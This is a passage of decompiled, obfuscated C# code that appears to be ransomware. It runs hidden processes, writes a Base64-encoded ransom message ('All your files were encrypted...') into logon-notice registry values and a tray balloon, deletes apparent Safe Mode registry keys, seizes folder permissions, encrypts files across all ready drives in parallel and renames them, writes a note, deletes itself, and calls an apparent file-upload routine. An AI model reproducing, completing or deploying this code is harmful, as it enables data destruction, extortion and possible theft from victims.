						.Replace(getString_0(107351414), getString_0(107352622))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107351409), getString_0(107352622)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string hdbKundeWzS(string ffDnDIwixvtV = "", string YkDfAzyRoMa = "")
	{
		string result = getString_0(107352622);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ffDnDIwixvtV,
				Arguments = YkDfAzyRoMa,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void xNhiyKryEBbF(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107351432),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string vfxAFpsOEpfxFmq(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string PezUDwzFibxi(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void RexFVGUHjnLQu(string SmlbRADSdKNBS = "", string CgPkJpTKpoB = "SW5mb3JtYXRpb24uLi4=", string ggXqsxzyTKR = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		SmlbRADSdKNBS = vfxAFpsOEpfxFmq(getString_0(107350871));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PezUDwzFibxi(SmlbRADSdKNBS), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PezUDwzFibxi(getString_0(107350774)), PezUDwzFibxi(CgPkJpTKpoB));
				registryKey.SetValue(PezUDwzFibxi(getString_0(107350741)), PezUDwzFibxi(ggXqsxzyTKR));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			SmlbRADSdKNBS = vfxAFpsOEpfxFmq(getString_0(107350712));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PezUDwzFibxi(SmlbRADSdKNBS), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PezUDwzFibxi(getString_0(107351119)), PezUDwzFibxi(CgPkJpTKpoB));
				registryKey.SetValue(PezUDwzFibxi(getString_0(107351086)), PezUDwzFibxi(ggXqsxzyTKR));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void duFRjPsZFUoIV()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (KrijLNFzkPOQaZ == getString_0(107396902) && !string.IsNullOrEmpty(MhlfKrXswfohvBt) && !string.IsNullOrEmpty(wCJyIqeqonYHbW))
				{
					RexFVGUHjnLQu(getString_0(107352622), MhlfKrXswfohvBt, wCJyIqeqonYHbW);
				}
				else
				{
					RexFVGUHjnLQu(getString_0(107352622), getString_0(107352611), getString_0(107352582));
				}
			}
		}
		catch
		{
		}
	}

	public static void RuLCYwFCDgYB(string VlrhneTGzAEj = "SW5mb3JtYXRpb24uLi4=", string CONlyiMtEOZ = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(PezUDwzFibxi(VlrhneTGzAEj));
		val.set_BalloonTipText(PezUDwzFibxi(CONlyiMtEOZ));
		val.ShowBalloonTip(30000);
	}

	public static void QdfEFCCQoiCFSM(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		hdbKundeWzS(PezUDwzFibxi(getString_0(107351057)), getString_0(107351072) + text + getString_0(107351031) + string_0);
	}

	public static void jjXKaygZnMfv(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = PezUDwzFibxi(getString_0(107351026));
		processStartInfo.Arguments = getString_0(107350997) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool VNZgLvaqfsBHa(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string FehKKEUfqtPH(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void kUQJNYlHhJjwOg()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = vfxAFpsOEpfxFmq(getString_0(107350992));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PezUDwzFibxi(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350374)));
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350317)));
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350300)));
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350307)));
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107351026)));
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350282)));
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107351057)));
					registryKey.Close();
				}
				string_ = vfxAFpsOEpfxFmq(getString_0(107350221));
				registryKey = Registry.LocalMachine.OpenSubKey(PezUDwzFibxi(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350156)));
					registryKey.Close();
				}
				string_ = vfxAFpsOEpfxFmq(getString_0(107350619));
				registryKey = Registry.LocalMachine.OpenSubKey(PezUDwzFibxi(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350156)));
					registryKey.Close();
				}
				string_ = vfxAFpsOEpfxFmq(getString_0(107350619));
				registryKey = Registry.CurrentUser.OpenSubKey(PezUDwzFibxi(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PezUDwzFibxi(getString_0(107350156)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			hdbKundeWzS(PezUDwzFibxi(getString_0(107350634)), PezUDwzFibxi(getString_0(107350585)));
			hdbKundeWzS(PezUDwzFibxi(getString_0(107350568)), PezUDwzFibxi(getString_0(107350559)));
			hdbKundeWzS(PezUDwzFibxi(getString_0(107350568)), PezUDwzFibxi(getString_0(107350381)));
			hdbKundeWzS(PezUDwzFibxi(getString_0(107349808)), PezUDwzFibxi(getString_0(107349823)));
		}
		catch
		{
		}
	}

	public static void LDYdJQzZKPd(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(PezUDwzFibxi(getString_0(107349718)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void FrnFyxljGs()
	{
		string string_ = vfxAFpsOEpfxFmq(getString_0(107349725));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PezUDwzFibxi(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PezUDwzFibxi(getString_0(107349644)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void WhwtpTrkWxTq()
	{
		hdbKundeWzS(getString_0(107396750), PezUDwzFibxi(getString_0(107350123)));
		string text = PezUDwzFibxi(getString_0(107349929));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107351414) + text + getString_0(107351414) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396750);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void InoKNxbMnPL(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(YnUuGHOKmtC, getString_0(107349352) + string_0 + getString_0(107349343) + ex.Message + getString_0(107397097));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string VtxukLeuoIqnc()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107352622);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107349254);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107349277))) ? getString_0(107349259) : getString_0(107349236));
				break;
			case 0:
				text = getString_0(107349282);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107349249);
				break;
			case 4:
				text = getString_0(107349204);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107349218) : getString_0(107349227));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107349194) : getString_0(107349167)) : getString_0(107349172)) : getString_0(107349213));
				break;
			case 10:
				text = getString_0(107349189);
				break;
			}
		}
		if (text != getString_0(107352622))
		{
			text = getString_0(107349184) + text;
			if (oSVersion.ServicePack != getString_0(107352622))
			{
				text = text + getString_0(107351031) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string mVIlYgHnwXvvZKv(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107396202);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(PezUDwzFibxi(getString_0(107396169)));
				streamWriter.WriteLine(getString_0(107397097));
				streamWriter.WriteLine(PezUDwzFibxi(getString_0(107391903)));
				streamWriter.WriteLine(string_0);
				if (PAqNnRchDyH)
				{
					streamWriter.WriteLine(getString_0(107397097));
					streamWriter.WriteLine(PezUDwzFibxi(getString_0(107391249)));
					streamWriter.WriteLine(KmMaNbsldEJY.ftqLxZfYrLhH());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !mAogUeKgKjciiQM)
				{
					File.AppendAllText(text, getString_0(107391216) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(YnUuGHOKmtC, getString_0(107349139) + ex.Message + getString_0(107397097));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void sRwboNuBnp(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		iXMODReroLTt.jldPxebaCTEV CS_0024_003C_003E8__locals0 = new iXMODReroLTt();
		CS_0024_003C_003E8__locals0.LnRuiadQwPaOYO = string_1;
		CS_0024_003C_003E8__locals0.YILhnTBijaRm = string_2;
		CS_0024_003C_003E8__locals0.HJQwyKJdDkzhs = string_3;
		CS_0024_003C_003E8__locals0.ntUFwYVnXwnvX = string_4;
		GpMeZoreMAmJ = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.HJQwyKJdDkzhs);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107349594))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !MsFMDtBGMtqBqX.Contains(array[i].Name))
					{
						MsFMDtBGMtqBqX.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!MsFMDtBGMtqBqX.Contains(string_0[j]))
				{
					MsFMDtBGMtqBqX.Add(string_0[j]);
				}
			}
		}
		if (MsFMDtBGMtqBqX.Contains(PezUDwzFibxi(getString_0(107349585))) && bmduXcpmAuV == getString_0(107396902))
		{
			MsFMDtBGMtqBqX.Remove(PezUDwzFibxi(getString_0(107349585)));
		}
		Parallel.ForEach(MsFMDtBGMtqBqX, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new iXMODReroLTt.jldPxebaCTEV();
			CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.OthvQpDMJub = string_0;
			if (KiWrkOzwNeQ && !VtxukLeuoIqnc().Contains(iXMODReroLTt.getString_0(107349227)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						VNZgLvaqfsBHa(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.OthvQpDMJub);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (PEsWJvkMybol == iXMODReroLTt.getString_0(107396911))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					crZXGfdxyHFE(CS_0024_003C_003E8__locals0.OthvQpDMJub, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.LnRuiadQwPaOYO, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.ntUFwYVnXwnvX, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.YILhnTBijaRm, CS_0024_003C_003E8__locals0.oATFKerpLrEKAmG.HJQwyKJdDkzhs);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				crZXGfdxyHFE(CS_0024_003C_003E8__locals0.OthvQpDMJub, CS_0024_003C_003E8__locals0.LnRuiadQwPaOYO, CS_0024_003C_003E8__locals0.ntUFwYVnXwnvX, CS_0024_003C_003E8__locals0.YILhnTBijaRm, CS_0024_003C_003E8__locals0.HJQwyKJdDkzhs);
			}
		});
	}

	public static void crZXGfdxyHFE(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107352622));
		List<string> list3 = list2;
		if (uEalWVhQubDqvM == getString_0(107396755))
		{
			list = sByLQIowDylVS(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = onsfHMsUjR.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((fmmIDlpGEZmQqC == getString_0(107396755) && !item.EndsWith(text)) || twsigDVIjwu.Contains(item))
				{
					continue;
				}
				if (ZvCBEZNGHm == getString_0(107396902))
				{
					try
					{
						if (TyZKNgMENwJFJ.XaMCZRYeWeP(item))
						{
							TyZKNgMENwJFJ.KajMhyCQYhazwSI(item);
						}
					}
					catch
					{
					}
				}
				twsigDVIjwu.Add(item);
				if (!kYHVChgvsRpLIPK.Contains(Path.GetDirectoryName(item)))
				{
					kYHVChgvsRpLIPK.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (vBKqMUxzeIsbM == getString_0(107396902) && fileStream.Length > Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024 && !list3.Contains(text))
					{
						if (GmyAlsJsED == getString_0(107396902))
						{
							foreach (string item2 in GudmyYRjNKBi)
							{
								if (item.ToLower().EndsWith(item2) && mIyxJtJKMNcFYRO == getString_0(107396902))
								{
									if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && mIyxJtJKMNcFYRO == getString_0(107396755))
								{
									try
									{
										KmMaNbsldEJY.uWayiSxqXzMe(getString_0(107352223), getString_0(107352186), getString_0(107352173), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = nCuLeFOJMwFm.SDNAkiJfsilGu(item, Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024);
						byte[] iDrQCKghbyOmD = nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						nCuLeFOJMwFm.qPbWhlKhAppzNfg(item, iDrQCKghbyOmD);
						if (string_2 != getString_0(107349608))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107349608))
					{
						lKGuPJSPEvl(item, item + string_2, GpMeZoreMAmJ);
					}
					else
					{
						lKGuPJSPEvl(item, item + getString_0(107349603), GpMeZoreMAmJ);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void VfdcdEIBdU(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		zCsmcvfctIQqb.JvVYRRIESgJ CS_0024_003C_003E8__locals0 = new zCsmcvfctIQqb();
		CS_0024_003C_003E8__locals0.jFEDMGNYImhkubB = list_0;
		CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq = string_1;
		CS_0024_003C_003E8__locals0.fWMKriILxpnJx = string_2;
		CS_0024_003C_003E8__locals0.iQTIcymIJnskgc = string_3;
		CS_0024_003C_003E8__locals0.PhQutbeFDiwVNXL = new List<string> { getString_0(107352622) };
		if (fmmIDlpGEZmQqC == getString_0(107396755))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.jFEDMGNYImhkubB)
				{
					if (CS_0024_003C_003E8__locals0.fWMKriILxpnJx.Length != 0)
					{
						string[] fWMKriILxpnJx2 = CS_0024_003C_003E8__locals0.fWMKriILxpnJx;
						int num2 = 0;
						while (num2 < fWMKriILxpnJx2.Length)
						{
							string value2 = fWMKriILxpnJx2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09e1;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq))
						{
							goto IL_09e1;
						}
					}
					catch (Exception)
					{
						goto IL_09e1;
					}
					if (item.EndsWith(string_0) && !twsigDVIjwu.Contains(item))
					{
						if (ZvCBEZNGHm == zCsmcvfctIQqb.getString_0(107396919))
						{
							try
							{
								if (TyZKNgMENwJFJ.XaMCZRYeWeP(item))
								{
									TyZKNgMENwJFJ.KajMhyCQYhazwSI(item);
								}
							}
							catch
							{
							}
						}
						twsigDVIjwu.Add(item);
						if (!kYHVChgvsRpLIPK.Contains(Path.GetDirectoryName(item)))
						{
							kYHVChgvsRpLIPK.Add(Path.GetDirectoryName(item));
						}
						InoKNxbMnPL(item);
						try
						{
							new qgJBARYOVEIp().GiGCbTRccdaXtRKR(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (AuaquqZBglw)
									{
										Console.WriteLine(zCsmcvfctIQqb.getString_0(107365833) + item + zCsmcvfctIQqb.getString_0(107365820) + new FileInfo(item).Length + zCsmcvfctIQqb.getString_0(107365767));
										Console.WriteLine(zCsmcvfctIQqb.getString_0(107365758));
									}
								}
								catch
								{
								}
								hdbKundeWzS(PezUDwzFibxi(zCsmcvfctIQqb.getString_0(107365173)), zCsmcvfctIQqb.getString_0(107351431) + item + zCsmcvfctIQqb.getString_0(107351431) + PezUDwzFibxi(zCsmcvfctIQqb.getString_0(107365148)) + zCsmcvfctIQqb.getString_0(107351431) + Environment.UserName + zCsmcvfctIQqb.getString_0(107351431) + PezUDwzFibxi(zCsmcvfctIQqb.getString_0(107365099)));
							}
						}
						catch (Exception ex18)
						{
							if (xhPAPGRrPiLSI)
							{
								try
								{
									File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + item + zCsmcvfctIQqb.getString_0(107365106) + ex18.Message + zCsmcvfctIQqb.getString_0(107397114));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex20)
							{
								if (xhPAPGRrPiLSI)
								{
									try
									{
										File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + item + zCsmcvfctIQqb.getString_0(107364993) + ex20.Message + zCsmcvfctIQqb.getString_0(107397114));
									}
									catch (Exception)
									{
									}
								}
								nejJdrwjWaKRmO++;
								goto end_IL_02cd_2;
							}
							if (!(vBKqMUxzeIsbM == zCsmcvfctIQqb.getString_0(107396919)) || new FileInfo(item).Length <= Convert.ToInt32(yYEzOFFalxHtfd) * 1024 * 1024 || CS_0024_003C_003E8__locals0.PhQutbeFDiwVNXL.Contains(string_0))
							{
								if (PAqNnRchDyH)
								{
									CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq = MjsEcDNWxGU + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq;
								}
								string text3 = WDSfXphiPpUqrV.XVxfUlkwIZSca(32);
								string s3 = iAHfzSnUkutzj.JugqgFJafiYWrN(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
								{
									if (!TpjoUwgOYzae)
									{
										if (!mAogUeKgKjciiQM)
										{
											tBEtVNBoVsVEH(item, item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, GpMeZoreMAmJ);
										}
										else
										{
											tBEtVNBoVsVEH(item, item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!mAogUeKgKjciiQM)
											{
												UANUsGuULdAJojl(item, item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, GpMeZoreMAmJ);
											}
											else
											{
												UANUsGuULdAJojl(item, item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (xhPAPGRrPiLSI)
											{
												try
												{
													File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + item + zCsmcvfctIQqb.getString_0(107349579) + ex22.Message + zCsmcvfctIQqb.getString_0(107397114));
												}
												catch (Exception)
												{
												}
											}
											nejJdrwjWaKRmO++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!TpjoUwgOYzae)
								{
									if (!mAogUeKgKjciiQM)
									{
										tBEtVNBoVsVEH(item, item + zCsmcvfctIQqb.getString_0(107349620), GpMeZoreMAmJ);
									}
									else
									{
										tBEtVNBoVsVEH(item, item + zCsmcvfctIQqb.getString_0(107349620), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!mAogUeKgKjciiQM)
										{
											UANUsGuULdAJojl(item, item, GpMeZoreMAmJ);
										}
										else
										{
											UANUsGuULdAJojl(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (xhPAPGRrPiLSI)
										{
											try
											{
												File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + item + zCsmcvfctIQqb.getString_0(107349579) + ex25.Message + zCsmcvfctIQqb.getString_0(107397114));
											}
											catch (Exception)
											{
											}
										}
										nejJdrwjWaKRmO++;
										goto end_IL_02cd_2;
									}
								}
								if (mAogUeKgKjciiQM)
								{
									if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
									{
										LDYdJQzZKPd(item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq, bytes3);
									}
									else
									{
										LDYdJQzZKPd(item, bytes3);
									}
								}
								goto IL_09e1;
							}
							CS_0024_003C_003E8__locals0 = new zCsmcvfctIQqb.ovqvOoOTXHbosC();
							CS_0024_003C_003E8__locals0.MPyxrgXdswzEa = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
								{
									if (PAqNnRchDyH)
									{
										CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq = MjsEcDNWxGU + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq);
								}
							}
							catch (Exception ex27)
							{
								if (xhPAPGRrPiLSI)
								{
									try
									{
										File.AppendAllText(YnUuGHOKmtC, zCsmcvfctIQqb.getString_0(107349369) + item + zCsmcvfctIQqb.getString_0(107365444) + ex27.Message + zCsmcvfctIQqb.getString_0(107397114));
									}
									catch (Exception)
									{
									}
								}
								nejJdrwjWaKRmO++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.mCkadvSFOV = zCsmcvfctIQqb.getString_0(107352639);
							if (CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq != zCsmcvfctIQqb.getString_0(107349625))
							{
								CS_0024_003C_003E8__locals0.mCkadvSFOV = item + CS_0024_003C_003E8__locals0.ENjMrAcnRYQPq;
							}
							else
							{
								CS_0024_003C_003E8__locals0.mCkadvSFOV = item;
							}
							if (GmyAlsJsED == zCsmcvfctIQqb.getString_0(107396919))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in GudmyYRjNKBi)
									{
										if (CS_0024_003C_003E8__locals0.mCkadvSFOV.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.MPyxrgXdswzEa.ENjMrAcnRYQPq) && mIyxJtJKMNcFYRO == zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107396922))
										{
											if (Convert.ToInt32(gIBdCgacaih) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.mCkadvSFOV).Length)
											{
												try
												{
													KmMaNbsldEJY.uWayiSxqXzMe(zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107352243), zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107352206), zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107352193), CS_0024_003C_003E8__locals0.mCkadvSFOV);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.mCkadvSFOV.ToLower().EndsWith(item2) && mIyxJtJKMNcFYRO == zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107396775))
										{
											try
											{
												KmMaNbsldEJY.uWayiSxqXzMe(zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107352243), zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107352206), zCsmcvfctIQqb.ovqvOoOTXHbosC.getString_0(107352193), CS_0024_003C_003E8__locals0.mCkadvSFOV);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
